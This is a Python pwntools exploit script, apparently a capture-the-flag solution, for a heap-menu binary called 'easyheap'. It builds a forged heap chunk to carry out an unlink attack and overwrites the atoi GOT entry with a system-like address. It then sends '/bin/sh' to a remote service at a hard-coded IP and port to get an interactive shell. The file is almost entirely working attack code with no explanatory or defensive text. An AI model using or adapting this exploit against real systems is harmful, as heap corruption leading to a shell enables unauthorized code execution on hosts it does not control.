#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './easyheap'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

def dbg():
	raw_input()

def menu(ch):
	p.sendlineafter('choice :', str(ch))

def add(size, content):
	menu(1)
	p.sendlineafter('Size of Heap : ', str(size))
	p.sendlineafter('Content of heap:', content)
	print "add a chunk !"

def edit(idx, content):
	menu(2)
	size = len(content)
	p.sendlineafter('Index :', str(idx))
	p.sendlineafter('Size of Heap : ', str(size))
	p.sendlineafter('Content of heap : ', content)
	print "edit %d chunk !" % idx

def free(idx):
	menu(3)
	p.sendlineafter('Index :', str(idx))


def backdoor():
	menu(0x1305)



def exploit():
	add(0x88, 'a')
	add(0x88, 'b')
	add(0x18, 'c')
	
	#unlink
	heap = 0x6020E0
	fake_fd = heap - 0x18
	fake_bk = heap - 0x10
	payload = p64(0) + p64(0x81) + p64(fake_fd) + p64(fake_bk)
	payload = payload.ljust(0x80, 'a')
	payload += p64(0x80) + p64(0x90)

	edit(0, payload)
	free(1)

	#gdb.attach(p, 'b* 0x400c87')
	dbg()
	#get shell
	payload = 'a'*0x18 + p64(heap-0x18) + p64(0) + p64(elf.got['atoi'])
	edit(0, payload)
	edit(2, p64(0x0400700))
	dbg()
	p.send("/bin/sh\x00")





if __name__ == '__main__':
	#p = process('./easyheap')
	p = remote('47.106.94.13', 50007)
	exploit()
	p.interactive()
	p.close()